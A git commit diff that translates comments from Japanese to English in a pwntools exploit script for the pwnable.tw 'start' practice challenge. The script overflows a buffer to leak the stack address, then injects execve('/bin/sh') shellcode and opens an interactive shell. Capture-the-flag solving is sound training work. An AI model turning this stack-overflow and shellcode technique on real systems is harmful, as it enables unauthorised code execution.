65cf65d6006841dbb970558bdd137d061c6dc301
FAMASoon <famasoon@gmail.com>
2019-08-27 15:58:35 +0000

    change language from ja to en

--- pwnabletw/start/writeup.py
+++ pwnabletw/start/writeup.py
@@ -1,13 +1,13 @@
 # coding: utf-8
 from pwn import *
 
-# 対象の情報を設定
+# Set target environment
 context(os='linux', arch='i386')
 
 HOST = 'chall.pwnable.tw'
 PORT = 10000
 
-# mov ecx, esp のアドレス
+# mov ecx, esp
 stack_leak = 0x08048087
 shellcode = asm('\n'.join([
     'push %d' % u32('/sh\0'),
@@ -19,32 +19,29 @@ shellcode = asm('\n'.join([
     'int 0x80',
 ]))
 
-# リモートでもローカルでもできるようにする
+# for to use remote or local
 if len(sys.argv) > 1 and sys.argv[1] == '-r':
     conn = remote(HOST, PORT)
 else:
     conn = process('./start')
 
 log.info('Pwning start')
-# 最初に送られてくる出力を吐き出させる
-# これをやらないとrecvのバッファの中に出力が溜まったままになる
 conn.recvuntil(":")
 
-# espの値をリークさせる
+# leak esp value
 stage1 = b'A'*0x14
 stage1 += p32(stack_leak)
 
-# 実際に送りespの値を保存
-# 一応、画面上にも出力する
+# Save esp value
 conn.send(stage1)
 stack_addr = u32(conn.recv(4))
 log.info("Stack Address: {}".format(hex(stack_addr)))
 
-# リークさせたespの値に文字列分のバイト数を足し、シェルコードを仕込んだ位置を決める
+# Set 0x14byte character + (leaked esp + 0x14byte) + shellcode
 stage2 = b'B'*0x14
 stage2 += p32(stack_addr + 0x14)
 stage2 += shellcode
 
-# シェルを取る
+# Get shell
 conn.sendline(stage2)
 conn.interactive()
